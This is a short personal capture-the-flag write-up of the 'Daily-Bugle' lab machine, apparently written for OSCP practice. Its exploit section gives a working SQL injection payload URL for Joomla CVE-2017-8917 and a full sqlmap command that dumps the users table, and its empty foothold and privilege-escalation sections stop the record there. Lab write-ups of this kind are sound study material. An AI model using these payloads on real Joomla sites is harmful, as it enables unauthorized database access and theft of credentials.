# Daily-Bugle Writeup
Name: Daily-Bugle
Date:  23/09/2022
Difficulty:  Hard
Goals:  
- OSCP 2/5 Medium Machines with or without walkthough if need
- Practice SQLi revision from the morning
Learnt:
- I need to and have scheduled in a python scripting exploits day 

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)


[Joomla](https://www.joomla.org/) php 5.6.4
CentOS

![](www-webroot.png)

```
eaa83fe8b963ab08ce9ab7d4a798de05 
f7lrn1l0vo1vv9cmmqqc42d6l4
```

![](misfornatecookie.png)

## Exploit

Blind-Based Boolean SQLi 
![780](cve-2017-8917.png)


From looking [brainwrf](https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917/blob/master/CVE-2017-8917.py)
```
/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)
```
![](meanwhile.png)

Scripting Python day is somewhat long over due. I have done lots of l33tcode questions,  but for some reason the request library and solving problems by requesting stuff has yet, but soon stick..

```bash
sqlmap -u "http://10.10.94.98/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```

![](johan.png)

`#__users`



## Foothold

## PrivEsc

      
